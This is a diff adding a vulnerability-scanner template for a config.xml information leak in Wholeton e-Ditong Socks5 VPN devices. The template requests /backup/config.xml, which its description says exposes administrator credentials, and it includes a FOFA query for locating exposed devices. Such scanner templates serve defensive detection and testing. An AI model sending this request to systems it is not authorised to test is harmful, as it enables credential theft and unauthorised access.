@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - administrator
+          - virtualadapter
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/backup/config.xml'
+id: wholeton-vpn-info-leak
+info:
+  author: zan8in
+  description: |
+    惠尔顿 e地通Socks5 VPN登录系统 存在信息泄漏漏洞，访问特殊的Url即可获取管理员账号密码
+    fofa: app="惠尔顿-e地通VPN"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 惠尔顿 e地通 config.xml 信息泄漏漏洞
+  severity: high
+  tags: wholeton,vpn,info,leak,argus-import
